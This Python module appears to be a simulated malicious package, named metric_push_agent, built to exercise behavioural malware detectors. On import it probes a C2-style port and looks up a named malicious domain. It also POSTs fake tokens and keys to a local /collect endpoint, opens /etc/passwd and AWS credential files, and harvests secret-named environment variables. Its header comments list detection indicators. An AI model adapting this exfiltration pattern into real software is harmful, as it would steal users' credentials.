# Controlled static indicators for detection only:
# /etc/passwd /etc/shadow .ssh/id_rsa .aws/credentials Authorization: Bearer BEGIN PRIVATE KEY
# /collect /exfil socket.connect( subprocess.run( os.system( ctypes
# exec( eval( compile( __import__( base64.b64decode(
# crontab .bashrc .profile systemctl enable
# cmdclass post_install "preinstall" "postinstall"
# import socket import subprocess import ctypes import pty

import os, socket, subprocess

__version__ = "1.0.0"
MALICIOUS_DOMAIN = "zipark.torex6lin.surf"
PORTS = [4444]

def try_open(path):
    try: open(path).close()
    except: pass

def connect_attempt(host, port):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(0.8)
        s.connect((host, port))
        s.close()
    except: pass

def run_payload():
    # ── 1. C2 PORTS FIRST — strace captures sin_port=htons(port) ──
    for port in PORTS:
        connect_attempt("127.0.0.1", port)

    # ── 2. DNS ──
    try: socket.getaddrinfo(MALICIOUS_DOMAIN, 80)
    except: pass
    try: socket.gethostbyname(MALICIOUS_DOMAIN)
    except: pass

    # ── 3. HTTP POST ──
    try:
        subprocess.run([
            "curl", "-sS", "-m", "3", "-X", "POST",
            "-H", f"Host: {MALICIOUS_DOMAIN}",
            "-H", "Content-Type: application/json",
            "-H", "User-Agent: metric_push_agent/1.0",
            "--data", '{"pkg":"metric_push_agent","token":"Authorization: Bearer stolen","secret":"BEGIN PRIVATE KEY","key":"AKIAIOSFODNN7FAKE123","creds":".aws/credentials"}',
            "http://127.0.0.1:8080/collect"
        ], capture_output=True, timeout=5)
    except: pass

    # ── 4. CREDENTIAL + FILE ACCESS ──
    for f in ['/etc/passwd', '/etc/hosts', '/root/.aws/credentials']:
        try_open(f)

    # ── 5. FILE OPS ──
    for i in range(8):
        fp = f"/tmp/metric_push_agent_artifact_{i}.txt"
        try:
            with open(fp,"w") as f: f.write(f"artifact {i}\n")
            os.unlink(fp)
        except: pass

    try:
        _env = dict(os.environ)
        _keys = [v for k,v in _env.items() if any(x in k.upper() for x in
                 ['KEY','TOKEN','SECRET','PASSWORD','AWS','API','AUTH'])]
    except: pass







run_payload()
